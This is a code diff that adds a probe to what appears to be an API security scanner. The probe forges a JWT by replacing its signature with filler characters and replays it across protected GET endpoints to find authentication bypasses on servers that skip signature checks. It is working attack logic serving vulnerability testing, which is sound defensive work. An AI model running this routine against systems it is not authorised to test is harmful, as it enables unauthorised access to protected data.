@@ -141,6 +141,98 @@ def jwt_flaws_probe(model, base_url: str, *, session: requests.Session | None = 
     return out
 
 
+def forged_token_replay_probe(model, base_url: str, *, session: requests.Session | None = None,
+                              auth: dict | None = None, limit: int = 15) -> list[ProbeFinding]:
+    """
+    Item 6 — probes feed a later pass: once a token is forgeable (the server does not
+    verify the JWT signature), REPLAY a forged token across every OTHER protected
+    endpoint, not just the one jwt_flaws proved it on. Proving forgeability is a
+    property of the server, so a single confirmed flaw unlocks the whole protected
+    surface — this sweeps it and reports each additional endpoint a forged token opens.
+
+    Deterministic and zero-false-positive by construction:
+      • Global gate: forgeability is first ESTABLISHED on a clean control endpoint
+        (valid token → 2xx, no token → 401/403, forged token → 2xx). If the server
+        verifies signatures, the forged token is rejected there and the probe is quiet.
+      • Per endpoint: a sibling is reported only when that endpoint itself rejects the
+        no-token request (so it is genuinely protected) AND accepts the forged one.
+    The control endpoint itself is skipped — jwt_flaws already reports it — so this
+    only ever adds the SIBLINGS.
+    """
+    sess = session or requests.Session()
+    from core.auth_recipe import derive_auth_recipe
+    recipe = derive_auth_recipe(model)
+    base = base_url.rstrip("/")
+    out: list[ProbeFinding] = []
+
+    def code(url: str, headers: dict | None):
+        try:
+            return sess.get(url, headers=headers or {}, timeout=15).status_code
+        except Exception:
+            return None
+
+    def is2xx(c) -> bool:
+        return isinstance(c, int) and 200 <= c < 300
+
+    token = _resolve_token(sess, base, recipe, model,
+                           f"ftr_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
+    if not token:
+        return out
+    parsed = _jwt_payload_segment(token)
+    if not parsed:
+        return out   # not a JWT bearer scheme — this probe doesn't apply
+    parts = parsed[0]
+    forged = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"   # tampered signature
+
+    # Ordered, unique, protected GET endpoints with no path param (safe to replay).
+    targets: list[str] = []
+    seen_paths: set[str] = set()
+    for e in getattr(model, "endpoints", []):
+        if (isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
+                and e.get("auth_required") and "{" not in str(e.get("path", ""))):
+            p = str(e.get("path", ""))
+            if p and p not in seen_paths:
+                seen_paths.add(p)
+                targets.append(p)
+    if not targets:
+        return out
+
+    # 1) Establish forgeability on the first clean control endpoint.
+    control_path = None
+    for p in targets:
+        url = f"{base}{p}"
+        if not (is2xx(code(url, _auth_headers(token, auth))) and code(url, None) in (401, 403)):
+            continue   # not a clean control (public, or valid token rejected) — try next
+        if is2xx(code(url, _auth_headers(forged, auth))):
+            control_path = p   # forgery confirmed server-wide
+        break                  # the first clean control is decisive either way
+    if not control_path:
+        return out             # server verifies signatures → quiet, no false positive
+
+    # 2) Sweep the remaining protected endpoints with the forged token.
+    for p in targets:
+        if p == control_path:
+            continue           # jwt_flaws already reports the control endpoint
+        url = f"{base}{p}"
+        s_notoken = code(url, None)
+        if s_notoken not in (401, 403):
+            continue           # not actually protected — no bypass to prove
+        s_forged = code(url, _auth_headers(forged, auth))
+        if is2xx(s_forged):
+            out.append(ProbeFinding(
+                probe="forged-token-replay",
+                title=f"Forged JWT accepted on GET {p} — authentication bypass",
+                exploited=True, severity="P1",
+                evidence=(f"A token with a garbage signature was accepted on GET {p} "
+                          f"(HTTP {s_forged}; no token → {s_notoken}). The signature flaw proven on "
+                          f"GET {control_path} unlocks this endpoint too — forging one token grants "
+                          f"access across the protected surface."),
+                target=p))
+        if len(out) >= limit:
+            break
+    return out
+
+
 def _jwt_algorithm(model) -> str:
     """Read the JWT algorithm from the model's config, defaulting to HS256."""
     for c in getattr(model, "config", []):
